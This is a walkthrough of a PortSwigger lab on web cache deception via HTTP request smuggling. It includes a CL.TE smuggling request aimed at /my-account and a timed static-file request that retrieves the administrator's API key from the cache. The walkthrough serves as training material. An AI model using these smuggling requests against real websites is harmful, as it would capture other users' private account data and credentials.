Works similar to Web Cache Poisoning but has a different purpose.

- Poisoning: The attacker causes the app to store some malicious content in the cache, and this content is server from the cache to other app users.
- Deception: The attacker causes the app to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.

So, the attacker smuggles a request that returns sensitive user-specific content:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 43
Transfer-Encoding: chunked
```
```
GET /private/messages HTTP/1.1
Foo: X
```

The next request from another user that is forwarded to the backend will be appended to the smuggled request, including cookies and other headers:

```http
Foo: XGET /static/some-image.png HTTP/1.1
Host: vulnerable-website.com
Cookie: sessionId=qdi14sdcvu3k5jn5ui
...
```

The backend responds to this request in the normal way. 

The URL in the request is for the private messages of the user and the request is processed in the context of the victim user's session. 

The frontend then caches this response against what it believes is the URL in the second request, which is /static/some-image.png:

```http
GET /static/some-image.png HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 200 OK
...
<h1>Your private messages</h1>
...
```

The attacker then visits the static URL and receives the sensitive content that is returned from the cache.

The problem here is that the attacker doesn't know the URL against which the sensitive content will be cached, because this will be whatever URL the victim requested when smuggling request took effect. In this case, the attacker may need to fetch a large number of static URLs to discover the captured data.

# Exploitation

## Lab
Front-end served doesn't support chunked encoding, and front-end is caching static resources.

The challenge is to perform a request smuggling attack such that the next user's request causes their API key to be saved in the cache.

Then the goal is to retrieve the API key from the cache and submit it as the lab solution. The login to the account can be done using the following credentials: `wiener:peter`.

## Solution

Prepare the attack request:

```http
POST / HTTP/1.1
Host: 0a1300ed04327d0182cd028b00c6004f.web-security-academy.net
Cookie: session=zsZ3Dyj7aYJuEhH2xj9w1qOK25Xz2bc0
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
X-Ignore : x
```

First after the log in I checked with `GET /my-account` can be retrieved the API key, since I don't know the victims username, and that was possible.

So, with this attack request, the whole request will be sent to the backend as one, and then since the backend uses `Transfer-Encoding` the request will be split after the `0`, and the remaining part will be left for the next victim's request.

Normal request:

I sent to the `Burp Repeater` a static page that was called automatically after viewing the `my-account`.

```http
GET /resources/js/tracking.js HTTP/2
Host: 0a1300ed04327d0182cd028b00c6004f.web-security-academy.net
Cookie: session=X1KbhMUOUxDHxGCqThWZkno0fUqEgtC9
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Referer: https://0a1300ed04327d0182cd028b00c6004f.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=1
```

I saw that the `max-age` is 30, so I waited until it was about 27 seconds, and sent the attack request a couple times, so it would be cached.

After that, when I sent the normal request again, I could see the API key of the administrator in the response:

```http
...
<div id=account-content>
    <p>Your username is: administrator</p>
    <div>Your API Key is: r6pPjs9B6GVkKfwwkZ4HnBnxgcuGYaWi</div><br/>
        <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
            <label>Email</label>
            <input required type="email" name="email" value="">
            <input required type="hidden" name="csrf" value="jlz9oiRO6vbBcmwMVx50IzigneYRBWIj">
            <button class='button' type='submit'> Update email </button>
        </form>
    </div>
</div>
...
```
